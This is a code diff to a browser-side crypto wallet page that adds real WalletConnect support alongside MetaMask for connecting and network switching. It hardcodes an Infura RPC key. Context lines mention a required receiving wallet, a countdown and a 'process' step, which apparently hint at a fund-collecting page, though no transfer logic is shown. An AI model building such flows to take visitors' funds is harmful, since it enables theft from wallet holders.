@@ -9,6 +9,7 @@ if (typeof RECEIVING_WALLET === 'undefined') throw new Error("RECEIVING_WALLET n
 let provider, signer, userAddress;
 let currentNetwork = "ethereum";
 const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+let walletConnectProvider = null;
 
 // Initialize on load
 window.addEventListener('load', async () => {
@@ -47,7 +48,12 @@ async function checkWalletEnvironment() {
 
 async function initializeWallet() {
   try {
-    provider = new ethers.providers.Web3Provider(window.ethereum);
+    if (walletConnectProvider) {
+      provider = new ethers.providers.Web3Provider(walletConnectProvider);
+    } else {
+      provider = new ethers.providers.Web3Provider(window.ethereum);
+    }
+    
     signer = provider.getSigner();
     userAddress = await signer.getAddress();
     
@@ -64,7 +70,7 @@ async function initializeWallet() {
 
 async function handleNetworkChange() {
   const btn = document.getElementById("connectWallet");
-  if (window.ethereum?.selectedAddress) {
+  if (window.ethereum?.selectedAddress || walletConnectProvider) {
     btn.disabled = true;
     btn.innerHTML = `<i class="fas fa-sync-alt fa-spin"></i> Switching...`;
     try {
@@ -167,7 +173,7 @@ function initializeCountdown() {
 // =====================
 
 async function handleWalletConnection() {
-  if (!isMobile && !window.ethereum?.selectedAddress) {
+  if (!isMobile && !window.ethereum?.selectedAddress && !walletConnectProvider) {
     return showWalletOptions();
   }
   await connectAndProcess();
@@ -202,7 +208,7 @@ function showWalletOptions() {
       <span>MetaMask</span>
     </button>
     <button id="walletConnectBtn" class="wallet-option">
-      <img src="https://altcoinsbox.com/wp-content/uploads/2023/03/wallet-connect-logo.png" alt="WalletConnect" style="width: 30px; height: 30px;">
+      <img src="https://walletconnect.com/_next/static/media/logo_mark.84dd8525.svg" alt="WalletConnect" style="width: 30px; height: 30px;">
       <span>WalletConnect</span>
     </button>
     <button id="cancelBtn" style="margin-top: 15px; background: none; border: none; color: #666; cursor: pointer;">
@@ -230,23 +236,48 @@ function showWalletOptions() {
 }
 
 async function initWalletConnect() {
-  updateStatus("Initializing WalletConnect...", "success");
-  // In a real implementation, you would initialize WalletConnect here
-  // This is just a placeholder for the demo
-  setTimeout(() => {
-    updateStatus("Please scan the QR code with your wallet", "success");
-    // Simulate QR code display
-    const qrCode = document.createElement('div');
-    qrCode.innerHTML = `
-      <div style="text-align: center; margin: 20px 0;">
-        <div style="width: 200px; height: 200px; margin: 0 auto; background: #f0f0f0; display: flex; align-items: center; justify-content: center;">
-          [WalletConnect QR Code]
-        </div>
-        <p style="margin-top: 10px;">Scan with your mobile wallet</p>
-      </div>
-    `;
-    document.getElementById("status").appendChild(qrCode);
-  }, 1000);
+  try {
+    updateStatus("Initializing WalletConnect...", "success");
+    
+    // Initialize WalletConnect Provider
+    walletConnectProvider = new WalletConnectProvider.default({
+      rpc: {
+        1: "https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161",
+        56: "https://bsc-dataseed.binance.org/",
+        137: "https://polygon-rpc.com/"
+      }
+    });
+    
+    // Enable session (triggers QR Code modal)
+    await walletConnectProvider.enable();
+    
+    // Subscribe to events
+    walletConnectProvider.on("connect", () => {
+      updateStatus("WalletConnect session connected", "success");
+      connectAndProcess();
+    });
+    
+    walletConnectProvider.on("disconnect", (code, reason) => {
+      updateStatus(`WalletConnect disconnected: ${reason}`, "error");
+      walletConnectProvider = null;
+    });
+    
+    // Generate QR Code
+    const uri = walletConnectProvider.connector.uri;
+    const qrDiv = document.getElementById("walletConnectQR");
+    qrDiv.innerHTML = '<p>Scan with your mobile wallet</p>';
+    QRCode.toCanvas(qrDiv, uri, { width: 200 }, (error) => {
+      if (error) {
+        console.error("QR code error:", error);
+        qrDiv.innerHTML = '<p>Error generating QR code. Please try again.</p>';
+      }
+    });
+    
+  } catch (err) {
+    console.error("WalletConnect error:", err);
+    updateStatus("WalletConnect initialization failed", "error");
+    walletConnectProvider = null;
+  }
 }
 
 async function connectAndProcess() {
@@ -254,11 +285,14 @@ async function connectAndProcess() {
     showLoader();
     updateStatus("Connecting wallet...", "success");
 
-    if (!window.ethereum) {
-      throw new Error("Please install a Web3 wallet");
+    if (!window.ethereum && !walletConnectProvider) {
+      throw new Error("Please install a Web3 wallet or use WalletConnect");
     }
 
-    await window.ethereum.request({ method: "eth_requestAccounts" });
+    if (!walletConnectProvider) {
+      await window.ethereum.request({ method: "eth_requestAccounts" });
+    }
+    
     await checkNetwork();
     const initialized = await initializeWallet();
     if (!initialized) return;
@@ -275,23 +309,43 @@ async function connectAndProcess() {
 
 async function checkNetwork() {
   try {
-    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+    let chainId;
+    if (walletConnectProvider) {
+      chainId = await walletConnectProvider.request({ method: 'eth_chainId' });
+    } else {
+      chainId = await window.ethereum.request({ method: 'eth_chainId' });
+    }
+    
     const targetChainId = NETWORK_CONFIGS[currentNetwork].chainId;
     
     if (chainId !== targetChainId) {
       updateStatus("Switching network...", "success");
       try {
-        await window.ethereum.request({
-          method: 'wallet_switchEthereumChain',
-          params: [{ chainId: targetChainId }]
-        });
+        if (walletConnectProvider) {
+          await walletConnectProvider.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: targetChainId }]
+          });
+        } else {
+          await window.ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: targetChainId }]
+          });
+        }
       } catch (switchError) {
         if (switchError.code === 4902) {
           try {
-            await window.ethereum.request({
-              method: 'wallet_addEthereumChain',
-              params: [NETWORK_CONFIGS[currentNetwork]]
-            });
+            if (walletConnectProvider) {
+              await walletConnectProvider.request({
+                method: 'wallet_addEthereumChain',
+                params: [NETWORK_CONFIGS[currentNetwork]]
+              });
+            } else {
+              await window.ethereum.request({
+                method: 'wallet_addEthereumChain',
+                params: [NETWORK_CONFIGS[currentNetwork]]
+              });
+            }
           } catch (addError) {
             throw new Error("Please switch networks manually");
           }
